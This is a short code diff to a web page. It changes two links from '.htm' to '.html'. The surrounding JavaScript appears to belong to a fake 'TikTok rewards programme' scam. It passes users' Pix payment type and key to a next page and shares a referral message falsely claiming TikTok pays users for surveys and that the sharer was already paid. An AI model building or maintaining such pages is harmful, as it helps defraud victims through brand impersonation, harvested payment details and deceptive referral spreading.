@@ -300,7 +300,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       }
       if(!valid) return;
 
-      const dest = new URL('../4/index.htm', window.location.href);
+      const dest = new URL('../4/index.html', window.location.href);
       new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
       dest.searchParams.set('pix_type', t);
       dest.searchParams.set('pix_key', key);
@@ -309,7 +309,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 
   // ─── Web Share / Convite ───────────────────────────────────────
   window.doShare = function(){
-    const shareUrl = window.location.origin + window.location.pathname.replace('withdraw.html','') + 'index.htm?ref=' + code;
+    const shareUrl = window.location.origin + window.location.pathname.replace('withdraw.html','') + 'index.html?ref=' + code;
     const shareText = '🎁 O TikTok está pagando usuários para responder uma pesquisa! Eu já recebi meu Pix. Usa meu código ' + code + ' e garanta o seu:';
     if(navigator.share){
       navigator.share({ title: 'Programa de Recompensas TikTok', text: shareText, url: shareUrl })
